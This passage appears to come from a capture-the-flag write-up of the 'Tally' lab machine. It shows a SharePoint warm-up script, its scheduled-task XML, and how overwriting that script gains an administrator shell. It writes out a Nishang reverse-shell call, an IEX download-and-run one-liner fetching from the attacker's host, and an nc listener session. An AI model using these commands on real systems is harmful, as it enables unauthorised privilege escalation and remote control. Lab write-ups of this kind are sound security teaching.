        # Warm up Office Online Server (OOS)
        $remoteuis = "m,o,oh,op,p,we,wv,x".Split(",")
        $services = "diskcache/DiskCache.svc,dss/DocumentSessionService.svc,ecs/ExcelService.asmx,farmstatemanager/FarmStateManager.svc,metb/BroadcastStateService.svc,pptc/Viewing.svc,ppte/Editing.svch,wdss/WordDocumentSessionService.svc,wess/WordSaveService.svc,wvc/Conversion.svc".Split(",")

        # Loop per WOPI
        $wopis = Get-SPWOPIBinding | Select-Object ServerName -Unique
        foreach ($w in $wopis.ServerName) {
                foreach ($r in $remoteuis) {
                        NavigateTo "http://$w/$r/RemoteUIs.ashx"
                        NavigateTo "https://$w/$r/RemoteUIs.ashx"
                }
                foreach ($s in $services) {
                        NavigateTo "http://$w"+":809/$s/"
                        NavigateTo "https://$w"+":810/$s/"
                }
        }
}

Function NavigateTo([string] $url) {
        if ($url.ToUpper().StartsWith("HTTP") -and !$url.EndsWith("/ProfileService.svc","CurrentCultureIgnoreCase")) {
                WriteLog "  $url" -NoNewLine
                # WebRequest command line
                try {
                        $wr = Invoke-WebRequest -Uri $url -UseBasicParsing -UseDefaultCredentials -TimeoutSec 120
                        FetchResources $url $wr.Images
                        FetchResources $url $wr.Scripts
                        Write-Host "."
                } catch {
                        $httpCode = $_.Exception.Response.StatusCode.Value__
                        if ($httpCode) {
                                WriteLog "   [$httpCode]" Yellow
                        } else {
                                Write-Host " "
                        }
                }
        }
}

Function FetchResources($baseUrl, $resources) {
    # Download additional HTTP files
    [uri]$uri = $baseUrl
    $rootUrl = $uri.Scheme + "://" + $uri.Authority
        
    # Loop
    $counter = 0
    foreach ($res in $resources) {
        # Support both abosolute and relative URLs
        $resUrl  = $res.src
        if ($resUrl.ToUpper().Contains("HTTP")) {
            $fetchUrl = $res.src
        } else {
            if (!$resUrl.StartsWith("/")) {
                $resUrl = "/" + $resUrl
            }
            $fetchUrl = $rootUrl + $resUrl
        }

        # Progress
        Write-Progress -Activity "Opening " -Status $fetchUrl -PercentComplete (($counter/$resources.Count)*100)
        $counter++
                
        # Execute
        Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $fetchUrl -TimeoutSec 120 | Out-Null
        Write-Host "." -NoNewLine
    }
    Write-Progress -Activity "Completed" -Completed
}

Function ShowW3WP() {
    # Total memory used by IIS worker processes
    $mb = [Math]::Round((Get-Process W3WP -ErrorAction SilentlyContinue | Select-Object workingset64 | Measure-Object workingset64 -Sum).Sum/1MB)
    WriteLog "Total W3WP = $mb MB" "Green"
}

Function CreateLog() {
    # EventLog - create source if missing
    if (!(Get-EventLog -LogName Application -Source "SPBestWarmUp" -ErrorAction SilentlyContinue)) {
        New-EventLog -LogName Application -Source "SPBestWarmUp" -ErrorAction SilentlyContinue | Out-Null
    }
}

Function WriteLog($text, $color) {
    $global:msg += "`n$text"
    if ($color) {
        Write-Host $text -Fore $color
    } else {
        Write-Output $text
    }
}

Function SaveLog($id, $txt, $error) {
    # EventLog
    if (!$skiplog) {
        if (!$error) {
            # Success
            $global:msg += $txt
            Write-EventLog -LogName Application -Source "SPBestWarmUp" -EntryType Information -EventId $id -Message $global:msg
        } else {      
            # Error
                        $global:msg += "ERROR`n"
            $global:msg += $error.Message + "`n" + $error.ItemName
            Write-EventLog -LogName Application -Source "SPBestWarmUp" -EntryType Warning -EventId $id -Message $global:msg
        }
    }
}

# Main
CreateLog
$cmdpath = (Resolve-Path .\).Path
$cmdpath += "\SPBestWarmUp.ps1"
$ver = $PSVersionTable.PSVersion
WriteLog "SPBestWarmUp v2.4.16  (last updated 2017-07-13)`n------`n"
WriteLog "Path: $cmdpath"
WriteLog "PowerShell Version: $ver"

# Check Permission Level
if (!$skipadmincheck -and !([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "You do not have elevated Administrator rights to run this script.`nPlease re-run as Administrator."
        break
} else {
    try {
        # SharePoint cmdlets
        Add-PSSnapin Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue | Out-Null

        # Task Scheduler
        $tasks = schtasks /query /fo csv | ConvertFrom-Csv
        $spb = $tasks |Where-Object {$_.TaskName -eq "\SPBestWarmUp"}
        if (!$spb -and !$install -and !$installfarm) {
            Write-Warning "Tip: to install on Task Scheduler run the command ""SPBestWarmUp.ps1 -install"""
        }
        if ($install -or $installfarm -or $uninstall) {
            Installer
            SaveLog 2 "Installed to Task Scheduler"
        }
        if ($uninstall) {
            break
        }
                
        # Core
        ShowW3WP
        WarmUp
        ShowW3WP
                
                # Custom URLs - Add your own below
                # Looks at Central Admin Site Title to support many farms with a single script
                (Get-SPWebApplication -IncludeCentralAdministration) |Where-Object {$_.IsAdministrationWebApplication -eq $true} |ForEach-Object {
                        $caTitle = Get-SPWeb $_.Url | Select-Object Title
                }
                switch -Wildcard ($caTitle) {
                        "*PROD*" {
                                #NavigateTo "http://portal/popularPage.aspx"
                                #NavigateTo "http://portal/popularPage2.aspx"
                                #NavigateTo "http://portal/popularPage3.aspx
                        }
                        "*TEST*" {
                                #NavigateTo "http://portal/popularPage.aspx"
                                #NavigateTo "http://portal/popularPage2.aspx"
                                #NavigateTo "http://portal/popularPage3.aspx
                        }
                        default {
                                #NavigateTo "http://portal/popularPage.aspx"
                                #NavigateTo "http://portal/popularPage2.aspx"
                                #NavigateTo "http://portal/popularPage3.aspx
                        }
                }
                SaveLog 1 "Operation completed successfully"
        } catch {
                SaveLog 101 "ERROR" $_.Exception
        }
}
```

The file is called SPBestWarmUp.ps1 and it also has an associated .xml with it:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-IIS-IISReset'] and EventID=3201]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5074]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5075]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5076]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5077]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5078]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5079]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5080]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5081]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5117]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5186]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
```

---

## Privilege escalation: scheduled task hijacking

This script is used to create a scheduled task under the current user's account, we can get this from the first few lines where the functions of the script are detailed:

```aaa
.PARAMETER install
        Typing "SPBestWarmUp.ps1 -install" will create a local Task Scheduler job under credentials of the current user. Job runs every 60 minutes on the hour to help automatically populate cache. Keeps cache full even after IIS daily recycle, WSP deployment, reboot, or other system events.
```

The task is executed once every hour so it can be a pain to wait that long just to root a box, but luckily this isn't the only path to root.

Continuing with the script analysis we can go check the code for the *install* function specifically and see what it does exactly. Here is the part where the task scheduler command is crafted:

```powershell
# Task Scheduler command
$suffix += " -skipadmincheck"   #We do not need administrative rights on local machines to check the farm
if ($allsites) {$suffix += " -allsites"}
if ($skipsubwebs) {$suffix += " -skipsubwebs"}
if ($skiplog) {$suffix += " -skiplog"}
$cmd = "-ExecutionPolicy Bypass -File SPBestWarmUp.ps1" + $suffix
```

It uses the *-ExecutionPolicy Bypass* flag to let users execute scripts even when an ExecutionPolicy is set, and it's a command that can be run from any low privilege account because according to Microsoft ExecutionPolicy isn't a security feature to protect from the execution of malicious scripts in the first place.

Up next is the section where the XML file is parsed to be updated with the details of the new scheduled task, meaning this is where the settings of this script are saved:

```powershell
$xmlCmdPath = $cmdpath.Replace(".ps1", ".xml")
[...]
# Update xml file
Write-Host "xmlCmdPath - $xmlCmdPath"
$xml = [xml](Get-Content $xmlCmdPath)
$xml.Task.Principals.Principal.UserId = $user
$xml.Task.Actions.Exec.Arguments = $cmd
$xml.Task.Actions.Exec.WorkingDirectory = (Split-Path ($xmlCmdPath)).ToString()
$xml.Save($xmlCmdPath)
```

If we check in our .xml file what command is supposed to be executed by the scheduled task we see it's the .ps1 script itself, and it is to be executed as Administrator:

```xml
<UserId>TALLY\Administrator</UserId>
<LogonType>Password</LogonType>
<RunLevel>HighestAvailable</RunLevel>
[...]
<Exec>
<Command>PowerShell.exe</Command>
<Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
<WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
</Exec>
```

So in theory *SPBestWarmUp.ps1* is being run every hour from Sarah's desktop, which is where we are right now, meaning we can overwrite the file with a reverse shell and it will be executed at every change of hour. I decided to test this with Nishang's reverse shell:

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $locate nishang | grep Tcp
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
┌─[baud@parrot]─[~/tally]
└──╼ $cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 SPBestWarmUp.ps1
```

Add this line at the end of the .ps1 script to launch the reverse shell as soon as the script is executed:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 9898
```

Then download the script on the desktop to overwrite the original:

```aaa
c:\Users\Sarah\Desktop>powershell iwr http://10.10.14.37:9090/SPBestWarmUp.ps1 -outfile ./SPBestWarmUp.ps1
```

Alternatively, you can leave the script on the attacking box and replace the content of the original with:

```aaa
c:\Users\Sarah\Desktop>echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37:9090/script.ps1')" > SPBestWarmUp.ps1
```

Now it's time to wait about one hour or hopefully less depending on when we happen to have landed on the box for the script to be executed and give us a shell as administrator. I was lucky and discovered this about ten minutes before the end of the hour so I didn't have much to wait, so pretty soon I received a shell:

```aaa
┌─[baud@parrot]─[~/tally]
└──╼ $nc -lvnp 9898
listening on [any] 9898 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.59] 51293
Windows PowerShell running as user Administrator on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Sarah\Desktop>whoami
tally\administrator
PS C:\Users\Sarah\Desktop>
```

And with this we can grab the last flag:

![img](/images/writeup-tally/7.png)

---

## Hinting at SeImpersonatePrivilege exploitation

When running *whoami /all* to see what privileges Sarah has SeImpersonatePrivilege is shown to be enabled:

```aaa
c:\Users\Sarah\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name   SID                                          
=========== =============================================
tally\sarah S-1-5-21-1971769256-327852233-3012798916-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

ERROR: Unable to get user claims information.
```

This because the user Sarah is part of the *NT SERVICE\MSSQLSERVER* group, this detail opens up a second root to path, which involves in using one of the "potato exploits" such as the classic Rotten Potato, Juicy Potato, and so on.

Because I didn't bother to root the box a second time, if you're interested in knowing how to use Juicy Potato to root a Windows host in a similar scenario refer to my [Conceal writeup](/post/htb-writeup-conceal/), where I root the box using this same method.











